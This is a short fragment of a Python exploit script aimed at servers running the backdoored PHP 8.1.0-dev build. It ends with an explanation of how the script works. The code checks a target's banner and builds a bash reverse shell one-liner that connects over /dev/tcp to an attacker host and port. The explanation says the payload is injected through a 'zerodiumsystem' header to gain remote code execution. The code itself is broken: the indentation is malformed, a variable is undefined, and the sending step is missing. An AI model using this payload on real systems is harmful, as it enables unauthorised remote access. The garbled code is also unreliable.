import os, sys, argparse, requests

request = requests.Session()

def check_target(args):
    response = request.get(args.url)

        if "PHP/8.1.0-dev" in header[1]:

    return False

def reverse_shell(args):
    payload = 'bash -c \"bash -i >& /dev/tcp/' + args.lhost + '/' + args.lport + ' 0>&1\"'

### How it works
The payload builds a bash reverse shell one-liner and injects it into the (intentionally misspelled) User-Agent header as zerodiumsystem('...'), exploiting a vulnerable endpoint that passes header values straight into a system call without sanitization. When the server processes the request, it executes the injected command, connecting back to the attacker’s listening host/port and giving them an interactive shell — a classic RCE via HTTP header injection.
